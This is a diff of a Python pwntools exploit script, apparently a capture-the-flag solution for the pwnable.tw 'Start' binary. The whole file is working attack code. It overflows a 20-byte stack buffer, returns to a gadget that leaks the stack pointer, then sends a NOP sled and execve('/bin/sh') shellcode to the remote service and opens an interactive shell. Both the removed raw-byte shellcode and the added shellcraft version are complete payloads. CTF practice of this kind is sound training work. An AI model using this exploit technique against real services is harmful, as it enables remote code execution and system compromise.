@@ -1,6 +1,11 @@
 #!/usr/bin/python
+'''
+CHALLENGE SOLUTION: pwnable.tw - Start
+AUTHOR: Hunter Gregal
+'''
 from pwn import *
 
+''' SETUP '''
 #set context
 context(arch='i386', os='linux', endian='little')
 
@@ -15,33 +20,44 @@ r = remote(HOST, PORT)
 #r = process('./start')
 #gdb.attach(proc.pidof(r)[0], "b *0x8048087\n")
 
+''' FOUND THROUGH DEBUGING '''
+BUFSIZE = 20 # Bytes to write before return address (EIP)
+ROPGADGET1 = p32(0x08048087) # ROPGADGET -> mov %ecx, %esp // leaks stack pointer
+
+''' JUMP TO USER INPUT '''
 #welcome msg
 print r.recvuntil(':') 
 
-#shellcode
-sc = "\x31\xd2" #xor %edx,edx //3rd arg to execve
-sc += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+''' LEAK ADDRESS OF USER INPUT '''
+# Return to ROP gadget that will leak the stack pointer (our input buffer)
+junk = 'A' * BUFSIZE  # pad buffer with A's
+ret =  ROPGADGET1 # ROP GADJET -> mov %ecx,%esp //leak ESP
+leakPayload = junk+ret
 
-#Get leak payload
-buf = "A"*20
-buf += "\x87\x80\x04\x08" #mov %ecx,%esp //leak ESP
 #Execute leak
-r.send(buf) #Not sendline , /n breaks this leak
+r.send(leakPayload) #Not sendline , /n breaks leak in this case
 
 leak = u32(r.recv(4)) #convert leak addr
 print "LEAK: %s" % hex(leak)
 r.recv() #recv rest if any
 
-#use leaked stack ptr to exec shellcode
-buf = "B"*20
-buf += p32(addr+0x18) #+24 - 20 for B's 4 for leak
-buf += "\x90"*8 #Pad with some NOPs
-buf += sc #sc
-#FINAL PAYLOAD: ("B"*20)+(leak+24)+(NOP*8)+(shellcode)
 
-#send payload
-r.send(buf)
+''' BUILD FINAL PAYLOAD '''
+# Ret to shellcode using address of input (leak)
+# In this case we will place our shellcode AFTER the buffer, and jump to it so that we are not limited in shellcode size
+junk = "B" * BUFSIZE # Pad with B's
+ret = p32(leak+BUFSIZE+4) # &leak+20+4 // Calculate shellcode address past our buffer
+nopsled = asm(shellcraft.nop()) * 8 # Nopsled safety net for shellcode
+sc = asm(
+            shellcraft.pushstr('/bin/sh') + # push /bin/sh
+            shellcraft.syscall('SYS_execve', 'esp', 0, 0) # call execve 
+        ) #shellcode
 
-#interact
+finalPayload = junk+ret+nopsled+sc
+print "FINAL PAYLOAD: %s" % finalPayload
+#FINAL PAYLOAD: ("B"*20)+(&leak+24)+(NOP*8)+(shellcode)
+
+
+''' DROP TO REMOTE SHELL '''
+r.send(finalPayload)
 r.interactive()
-
